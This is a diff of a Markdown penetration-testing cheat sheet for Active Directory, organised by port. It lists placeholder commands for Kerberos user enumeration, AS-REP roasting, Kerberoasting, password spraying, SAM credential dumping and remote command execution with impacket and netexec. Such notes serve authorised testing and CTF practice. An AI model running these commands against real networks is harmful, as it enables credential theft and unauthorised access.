@@ -3,8 +3,32 @@
 - `nmap -n -Pn -p- -sV 0.0.0.0 `
 
 
+
+## 88
+impacket
+```sh
+# userenum & asreproast
+impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAINNAME'
+impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -no-pass 'DOMAINNAME/USERNAME'
+```
+kerbrute
+```sh
+# userenum
+./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAINNAME' 'USERLIST'
+```
+netexec
+```sh
+# ASREPRoast (TCP389番も必要)
+netexec ldap 'IP' -u 'USERNAMELIST' -p '' --asreproast 'OUTPUT.txt'
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --asreproast 'OUTPUT.txt'
+```
+
+
+
 ## 135
 https://github.com/XiaoliChan/wmiexec-Pro
+
+
 
 ## 389
 ### netexec
@@ -12,17 +36,14 @@ https://github.com/XiaoliChan/wmiexec-Pro
 # Authentication
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
 # Enumerate Domain Users
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export users.txt
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export 'OUTPUT.txt'
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --active-users
 # Enumerate Domain Groups
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
 # Find Domain SID
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --get-sid
-# ASREPRoast (TCP88番も必要)
-netexec ldap 'IP' -u 'USERNAMELIST' -p '' --kdchost 'IP' --asreproast asreproast.txt
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --asreproast asreproast.txt
 # Kerberoasting (TCP88番も必要)
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting kerberoast.txt
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting 'OUTPUT.txt'
 # Admin Count
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --admin-count
 # Machine Account Quota
@@ -32,30 +53,28 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M get-desc-users
 # Read DACL Rights
 https://www.netexec.wiki/ldap-protocol/read-dacl-right
 # Bloodhound Ingestor
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
+netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
 # List DC IP / Enum Trust
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
 ```
-
 ### impacket
 ```sh
 # kerberoasting (TCP88番も必要)
-impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+impacket-GetUserSPNs -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
 ```
 
 
-## 445 (139も)
+
+## 445 (139を使うことも)
 (msrpcはTCP135番やDynamicPortも使う)
 ### donpapi
 ```sh
 donpapi
 ```
-
 ### enum4linux-ng
 ```sh
 enum4linux-ng -A -u 'USERNAME' -p 'PASSWORD' -t 'TIMEOUT' 'IP'
 ```
-
 ### impacket
 ```sh
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
@@ -64,7 +83,6 @@ impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/
 impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows OR ShellBrowserWindow OR MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
-
 ### netexec
 ```sh
 # Password Spraying
@@ -83,7 +101,7 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --shares
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --pass-pol
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --rid-brute
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --local-group
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export usres.txt
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export 'OUTPUT.txt'
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --loggedon-users
 # Obtaining Credentials
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --sam
@@ -105,27 +123,27 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'wmiexec' -x '
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x 'COMMAND'
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
 ```
-
 ### smbclient
 ```sh
 smbclient -L 'HOST' -U 'DOMAIN/USERNAME%PASSWORD'
 smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
 ```
-
 ### smbmap
 ```sh
-smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g smbmap.txt
-smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g smbmap.txt
+smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g 'OUTPUT.txt'
+smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g 'OUTPUT.txt'
 ```
-
 
 
 ## link
 https://github.com/kavika13/RemCom
 
 
+## list
+### generate wordlist
+https://github.com/urbanadventurer/username-anarchy
 
-## credentials
+### seclists
 ```sh
 └─$ find /usr/share/seclists/Usernames -type f -exec wc -l {} +
     1000 /usr/share/seclists/Usernames/Names/malenames-usa-top1000.txt
